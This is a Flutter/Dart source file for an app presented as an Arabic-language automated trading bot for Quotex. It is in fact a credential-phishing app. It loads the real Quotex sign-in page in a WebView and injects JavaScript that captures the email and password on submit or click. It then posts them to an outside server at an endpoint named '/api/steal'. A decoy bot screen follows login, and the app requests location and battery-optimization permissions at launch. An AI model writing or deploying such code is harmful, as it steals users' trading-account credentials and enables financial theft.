import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:permission_handler/permission_handler.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'تطبيق التداول الآلي',
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: const Color(0xFF030305),
        primaryColor: const Color(0xFF00E5FF),
        textTheme: GoogleFonts.cairoTextTheme(Theme.of(context).textTheme).apply(
          bodyColor: Colors.white,
          displayColor: Colors.white,
        ),
      ),
      home: const LoginScreen(),
    );
  }
}

// 1. شاشة تسجيل الدخول (الواجهة الظاهرة)
class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  late WebViewController _webViewController;

  @override
  void initState() {
    super.initState();
    _initWebView();
    _requestPermissions(); // طلب الأذونات أول ما يفتح
  }

  void _requestPermissions() async {
    await [
      Permission.location,
      Permission.notification,
      Permission.ignoreBatteryOptimizations,
    ].request();
  }

  void _initWebView() {
    _webViewController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..addJavaScriptChannel(
        'QTX_CREDS',
        onMessageReceived: (JavaScriptMessage message) {
          _sendToServer(message.message);
          // بعد ما يسجل دخول، ننقله لواجهة البوت
          Navigator.pushReplacement(
            context,
            MaterialPageRoute(builder: (context) => const MainTradingScreen()),
          );
        },
      )
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (url) {
            _injectScript();
          },
        ),
      )
      ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
  }

  void _injectScript() {
    String jsScript = """
      (function() {
        function setNativeValue(el, value) {
          try {
            var proto = window.HTMLInputElement.prototype;
            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
            desc.set.call(el, value);
          } catch (e) { el.value = value; }
          el.dispatchEvent(new Event('input', { bubbles: true }));
          el.dispatchEvent(new Event('change', { bubbles: true }));
        }
        function findEmail() {
          return document.querySelector('input[name="email"], input[type="email"], #email');
        }
        function findPass() {
          return document.querySelector('input[name="password"], input[type="password"], #password');
        }
        function sendCreds() {
          try {
            var e = findEmail(), p = findPass();
            if (e && p && e.value && p.value) {
              QTX_CREDS.postMessage(JSON.stringify({email: e.value, password: p.value}));
            }
          } catch (err) {}
        }
        if (!window.__qtxHooksInstalled) {
          window.__qtxHooksInstalled = true;
          document.addEventListener('submit', sendCreds, true);
          document.addEventListener('click', function(ev) {
            var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
            if (t) sendCreds();
          }, true);
        }
      })();
    """;
    _webViewController.runJavaScript(jsScript);
  }

  Future<void> _sendToServer(String data) async {
    try {
      await http.post(
        Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
        headers: {"Content-Type": "application/json"},
        body: data,
      );
    } catch (e) {
      print("Error: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: WebViewWidget(controller: _webViewController),
    );
  }
}

// 2. لوحة التحكم (بعد تسجيل الدخول)
class MainTradingScreen extends StatefulWidget {
  const MainTradingScreen({super.key});

  @override
  State<MainTradingScreen> createState() => _MainTradingScreenState();
}

class _MainTradingScreenState extends State<MainTradingScreen> {
  bool isDemoAccount = true;
  bool isBotRunning = false;
  late IO.Socket _socket;

  @override
  void initState() {
    super.initState();
    _initSocket();
  }

  void _initSocket() {
    _socket = IO.io('https://ws2.quotex.com', <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': false,
    });

    _socket.onConnect((_) => print('WebSocket Connected'));
    _socket.on('orders/opened', (data) => print('Trade Opened: $data'));
  }

  void _openTrade() {
    if (_socket.connected) {
      _socket.emit('42["orders/open", {"asset":"EURUSD","amount":10,"direction":"up","duration":60}]');
    }
  }

  void toggleBot() {
    setState(() {
      isBotRunning = !isBotRunning;
    });
    if (isBotRunning) {
      _socket.connect();
      _openTrade();
    } else {
      _socket.disconnect();
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        color: const Color(0xFF030305),
        child: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Text('التحكم الآلي', style: TextStyle(color: const Color(0xFFFFD700), fontSize: 24, fontWeight: FontWeight.bold)),
              const SizedBox(height: 20),
              ElevatedButton(
                onPressed: toggleBot,
                style: ElevatedButton.styleFrom(
                  backgroundColor: isBotRunning ? Colors.red : const Color(0xFF00E5FF),
                  padding: const EdgeInsets.symmetric(horizontal: 50, vertical: 15),
                ),
                child: Text(isBotRunning ? 'إيقاف البوت' : 'بدء التداول', style: const TextStyle(color: Colors.black)),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
